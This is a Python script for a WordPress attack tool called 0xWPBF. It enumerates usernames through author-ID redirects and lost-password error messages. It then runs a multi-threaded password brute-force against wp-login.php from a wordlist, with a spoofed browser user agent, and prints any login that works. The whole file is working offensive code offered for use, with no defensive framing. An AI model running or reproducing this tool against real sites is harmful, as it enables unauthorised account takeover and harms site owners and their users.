#!/usr/bin/python
# coding: utf-8
from __future__ import print_function
import itertools
import threading
import time
import sys, os, argparse
import mechanicalsoup

print('''
    \033[1;33m█▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀\033[1;m
    \033[1;31m█▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER\033[1;m
    \033[1;33m█▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░ v1.2
    Coded By Abdullah AlZahrani | Website: www.0xa.tech
    Twitter: @0xAbdullah | GitHub.com/0xAbdullah\033[1;m
    ''')

parser = argparse.ArgumentParser(description="\033[1;33m[--]\033[1;m Wordpress users enumerate and brute force attack")
parser.add_argument('-s', required=False, default=None, help='Target Website.')
parser.add_argument('-p', required=False, default=None, help='Password list / Path of password file.')
parser.add_argument('-u', required=False, default=None, help='Target username.')
parser.add_argument('-e', required=False, default=None, help='Guess usernames / Path of usernames file.')
parser.add_argument('-t', required=False, default=None, help='Number of threads.')

args = vars(parser.parse_args())

if len(sys.argv) == 1:
    print("[\033[1;33m--\033[1;m] Usage: python 0xwpbf.py -h")
    sys.exit()

host = args['s']
if not host.startswith("http"):
    sys.exit("[\033[1;33m--\033[1;m] Wrong Site formate (ex): http://{}".format(host))

browser = mechanicalsoup.StatefulBrowser(
    soup_config={'features': 'lxml'},
    raise_on_404=True,
    user_agent='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2228.0 Safari/537.36', )

if args['t'] is not None:
    numThreads = int(args['t'])
else:
    numThreads = int(1)

def info():
    browser.open(host)
    page = browser.get_current_page()
    print("[\033[1;33m--\033[1;m] Website: {} ".format(host))
    print("[\033[1;33m--\033[1;m] Title: {}\n".format(page.title.text.encode('utf-8')))


info()


def _bruteForce():
    done = False
    print('\r[\033[1;33m--\033[1;m] To stop press Ctrl + Z')
    print('\r[\033[1;33m--\033[1;m] Number of thread/s: {}'.format(numThreads))
    def animate():  # animation function
        for c in itertools.cycle(['|', '/', '-', '\\']):
            if done:
                sys.stdout.flush()
                print('\r[\033[1;33m--\033[1;m] Done !                                ')
                sys.stdout.flush()
                sys.exit()


            sys.stdout.write('\r[\033[1;33m--\033[1;m] Starting the password Brute Forcer [{}]                 '.format(c))
            sys.stdout.flush()
            time.sleep(0.1)

    if os.path.exists(args['p']) == False:
        print("[\033[1;41m--\033[1;m] Password File Path Does Not exist !")
        sys.exit()
    pwdFile = open(args['p'], 'r')

    def bruteForce():  # thread Brute Force function
        for password in pwdFile:
            try:
                browser.open(host + '/wp-login.php')
                browser.select_form('#loginform')
                browser["log"] = args['u']
                browser["pwd"] = password
                browser.submit_selected()
                page = browser.get_current_page()
                wpLogin = page.find("div", class_="wp-menu-name")
                if wpLogin:
                    print("\n[\033[1;32m--\033[1;m] Password Found"
                          "\n[\033[1;32m--\033[1;m] WP-login: {}/wp-admin"
                          "\n[\033[1;32m--\033[1;m] Username: {}"
                          "\n[\033[1;32m--\033[1;m] Password: {}"
                          .format(host, args['u'], password))
            except mechanicalsoup.utils.LinkNotFoundError:
                sys.stdout.flush()
                sys.stdout.write('\r[\033[1;33m--\033[1;m] website may be down Or you have been banned!          ')
            except KeyboardInterrupt:
                print('sdsd')
            except:
                pass

    loading = threading.Thread(target=animate)
    threads = []

    for i in range(numThreads):
        threadBruteForce = threading.Thread(target=bruteForce)
        threadBruteForce.start()
        threads.append(threadBruteForce)

    loading.start()
    threadBruteForce.join()
    done = True


def autoEnumeration():
    checkUser = (host + "/?author=")
    found = 0
    ID = 1
    print("[\033[1;33m--\033[1;m] Searching for active username/s automatically!")
    for i in checkUser:
        try:
            check = (checkUser + str(ID))
            res = browser.open(check)
            user = res.url.rsplit('/', 0)[-1]
            user = user.rsplit('/', 1)
            user = ''.join(user)
            user = user.rsplit('/', 1)[1]
            usernameList = []
            if "author" in user:
                if found:
                    break
                print("[\033[1;41m--\033[1;m] There is a problem, the URL can not be traced")
                break
            print("[\033[1;32m--\033[1;m] username: {}".format(user))
            found = True
            ID = 1 + ID
            if user in usernameList:
                break
            usernameList.append(user)
        except mechanicalsoup.utils.LinkNotFoundError:
            if found == 1:
                break
            else:
                print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
                break
        except KeyboardInterrupt:
            sys.exit('[--] EXIT...')


def manualEnumeration():
    if os.path.exists(args['e']) == False:
        print("[\033[1;41m--\033[1;m] Usernames File Path Does Not exist !")
        sys.exit()
    userFile = open(args['e'], "r")
    found = False
    print("[\033[1;33m--\033[1;m] Searching for username/s!")
    for user in userFile:
        user = user.split()
        try:
            browser.open(host + "/wp-login.php?action=lostpassword")
            browser.select_form('#lostpasswordform')
            browser["user_login"] = user
            browser.submit_selected()
            page = browser.get_current_page()
            lostPassword = page.find("div", id="login_error")
            if lostPassword:
                pass
            else:
                print("[\033[1;32m--\033[1;m] username: {}".format(user[0]))
                found = True
        except KeyboardInterrupt:
            sys.exit('[--] EXIT...')
        except:
            print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
            sys.exit()

    if found == False:
        print("[\033[1;41m--\033[1;m] Not found usernames!")

def main():
    if args['s'] is not None and args['e'] is not None:
        manualEnumeration()
    elif args['s'] is not None and args['u'] is None:
        autoEnumeration()
    elif args['s'] is not None and args['u'] is not None and args['p'] is not None:
        _bruteForce()
    else:
        print("\033[1;33m[!]\033[1;m Input is not correct, check them out! Or typing python 0xwpbf.py -h")

if __name__ == '__main__':
    main()
